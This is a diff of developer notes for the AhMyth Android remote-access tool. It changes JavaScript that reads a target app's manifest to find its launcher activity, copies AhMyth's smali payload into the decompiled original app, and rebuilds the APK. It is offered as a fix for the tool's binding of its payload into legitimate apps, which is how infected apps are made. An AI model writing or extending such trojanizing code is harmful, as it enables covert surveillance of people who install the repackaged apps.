@@ -1,6 +1,6 @@
 Launcher Extraction for `<application"` attribute | AppCtrl.js = Line 5658 --> 5707 |
 ```javascript
-function GetLauncherPath(manifest, smaliPath) {
+function GetLauncherActivity(manifest) {
 
 
     var regex = /<application/gi,
@@ -33,19 +33,16 @@ function GetLauncherPath(manifest, smaliPath) {
 
             if (manifest.indexOf('android:targetActivity="') != -1) {
                 manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
-                manifest = manifest.substring(1, manifest.indexOf('"'))
-                manifest = path.join(smaliPath, manifest) + '.smali';
-                var files = fs.walkSync(smaliPath);
-                for (var i = 0; i < files.length; i++) {
-                    if (files[i].substring(files[i].lastIndexOf("/") + 1) == manifest)
-                        return files[i];
-                }
+                manifest = manifest.substring(0, manifest.indexOf('"'))
+                manifest = manifest.replace(/\./g, "/");
+                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
+                return manifest;
 
             } else {
                 manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                 manifest = manifest.substring(0, manifest.indexOf('"'))
                 manifest = manifest.replace(/\./g, "/");
-                manifest = path.join(smaliPath, manifest) + ".smali"
+                manifest = manifest.substring(manifest.lastIndexOf("/") + 1) + ".smali"
                 return manifest;
             }
 
@@ -163,9 +160,28 @@ Stop function for the AhMyth Listener | index.html = Line 69 |
 ```html
 <button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
 ```
+## Sets of code to fix a major binding bug in AhMyth
+New function for copying AhMyth files to the original app
+```js
+    // function to copy ahmyth source files to the orginal app
+    // and if success go to generate the apk
+    $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
 
-code utilising `unix "find"` command to find the correct launcher activity | AppCtrl.js | FINALLY FUCKING WORKS!!!!!
-need to implement ShellJS for cross-platform operation of this function now
+        $appCtrl.Log("Copying Ahmyth files to orginal app...");
+        $appCtrl.Log();
+        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, launcherPath), (error) => {
+            if (error) {
+                $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log();
+                return;
+            }
+
+            $appCtrl.GenerateApk(apkFolder);
+        })
+
+    };
+```
+Existing functons updated for the newly created "Launcher Location function" contained in this snippet
 ```javascript
             var launcherActivity = GetLauncherActivity(data, apkFolder);
             if (launcherActivity == -1) {
@@ -244,7 +260,7 @@ need to implement ShellJS for cross-platform operation of this function now
 
     }
 ``` 
-new GetLauncherPath function for the new launcher location funtion
+New "GetLauncherActivity" function | supersedes the old "GetLauncherPath" function
 ```js
 //function to extract the launcher activity from the orginal app
 function GetLauncherActivity(manifest) {
